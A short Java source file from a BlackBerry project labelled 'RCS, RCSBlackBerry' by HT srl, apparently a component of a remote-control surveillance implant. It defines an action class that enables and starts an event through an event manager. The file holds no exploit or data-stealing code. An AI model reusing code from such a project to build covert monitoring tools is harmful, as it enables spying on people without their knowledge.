//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action;

import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.manager.EventManager;

public class EnableEventAction extends EventAction {
    //#ifdef DEBUG
    private static Debug debug = new Debug("StartEventAction",
            DebugLevel.VERBOSE);
    //#endif
    public EnableEventAction(ConfAction params) {
        super( params);
    }

    public boolean execute(Trigger trigger) {
        //#ifdef DEBUG
        debug.trace("execute: "+eventId);
        //#endif

        final EventManager eventManager = EventManager.getInstance();

        eventManager.enable(Integer.toString(eventId));
        eventManager.start(Integer.toString(eventId));
        return true;
    }

}
